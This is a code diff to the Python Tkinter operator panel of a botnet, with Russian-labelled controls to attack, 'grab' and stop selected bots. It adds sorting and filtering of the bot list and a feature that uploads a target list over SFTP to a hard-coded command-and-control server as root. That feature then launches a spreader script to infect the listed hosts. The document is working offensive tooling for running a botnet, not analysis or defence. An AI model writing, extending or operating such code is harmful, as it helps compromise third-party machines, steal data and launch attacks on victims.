@@ -1,5 +1,5 @@
 import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext, simpledialog
+from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
 import threading, socket, json, time, subprocess, os, re, requests
 from gui.widgets import RightClickMenu
 
@@ -24,6 +24,8 @@ class BotnetTab(ttk.Frame):
         self.bots = {}
         self._last_fetch_error = 0
         self.my_ip = self._get_my_public_ip()
+        self.sort_col = None
+        self.sort_asc = True
         self.create_widgets()
         self.after(5000, self._auto_refresh)
 
@@ -48,13 +50,18 @@ class BotnetTab(ttk.Frame):
         ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
         ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
+        ttk.Label(ctrl, text="Фильтр:").pack(side=tk.LEFT, padx=(20,5))
+        self.filter_var = tk.StringVar(value="Все")
+        self.filter_combo = ttk.Combobox(ctrl, textvariable=self.filter_var, values=["Все", "Online", "Offline"], width=10, state='readonly')
+        self.filter_combo.pack(side=tk.LEFT)
+        self.filter_combo.bind('<<ComboboxSelected>>', lambda e: self.refresh_bots())
 
         tree_frame = ttk.Frame(bot_frame)
         tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         columns = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen")
         self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
         for col in columns:
-            self.tree.heading(col, text=col.capitalize())
+            self.tree.heading(col, text=col.capitalize(), command=lambda c=col: self.sort_by_column(c))
             self.tree.column(col, width=100, anchor="center")
         self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
         scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
@@ -114,6 +121,8 @@ class BotnetTab(ttk.Frame):
         self.btn_check_c2.pack(side=tk.LEFT, padx=10)
         self.btn_update_vps = ttk.Button(f, text="Обновить VPS", command=self.update_vps)
         self.btn_update_vps.pack(side=tk.LEFT, padx=10)
+        self.btn_load_targets = ttk.Button(f, text="Загрузить цели", command=self.load_targets_file)
+        self.btn_load_targets.pack(side=tk.LEFT, padx=10)
 
         self.spread_progress_var = tk.DoubleVar()
         self.spread_progress = ttk.Progressbar(spread_frame, variable=self.spread_progress_var, maximum=100, mode='determinate')
@@ -238,9 +247,27 @@ class BotnetTab(ttk.Frame):
                         self._last_fetch_error = now
                 time.sleep(2)
 
+    def sort_by_column(self, col):
+        if self.sort_col == col:
+            self.sort_asc = not self.sort_asc
+        else:
+            self.sort_col = col
+            self.sort_asc = True
+        self.refresh_bots()
+
     def _update_tree_safe(self, bots):
         selected_ips = [self.tree.item(i, 'values')[0] for i in self.tree.selection()]
         self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
+        # Фильтр
+        filter_val = self.filter_var.get()
+        if filter_val == "Online":
+            bots = [b for b in bots if b.get("status") == "online"]
+        elif filter_val == "Offline":
+            bots = [b for b in bots if b.get("status") != "online"]
+        # Сортировка
+        if self.sort_col:
+            idx = ("ip", "hostname", "os", "cpu", "ram", "status", "rps", "last_seen").index(self.sort_col)
+            bots = sorted(bots, key=lambda x: x.get(self.sort_col, ""), reverse=not self.sort_asc)
         for item in self.tree.get_children():
             self.tree.delete(item)
         total = len(bots)
@@ -349,6 +376,31 @@ class BotnetTab(ttk.Frame):
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
         threading.Thread(target=run, daemon=True).start()
+
+    # ----- Загрузка файла целей -----
+    def load_targets_file(self):
+        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
+        if path:
+            if not self.vps_pass:
+                self.vps_pass = simpledialog.askstring("VPS пароль", "Введите пароль для root@80.249.146.202:", show='*')
+                if not self.vps_pass:
+                    return
+            def run():
+                try:
+                    import paramiko
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
+                    sftp = client.open_sftp()
+                    sftp.put(path, "/root/c2/targets.txt")
+                    sftp.close()
+                    self.spread_log.insert(tk.END, f"[*] Файл загружен на VPS. Запуск спредера по списку...\n")
+                    cmd = "cd /root/c2 && screen -dmS spreader python3 -u botnet/spreader.py --targets /root/c2/targets.txt"
+                    client.exec_command(cmd)
+                    client.close()
+                except Exception as e:
+                    self.spread_log.insert(tk.END, f"[!] Ошибка загрузки: {e}\n")
+            threading.Thread(target=run, daemon=True).start()
 
     # ----- Обновление VPS -----
     def update_vps(self):
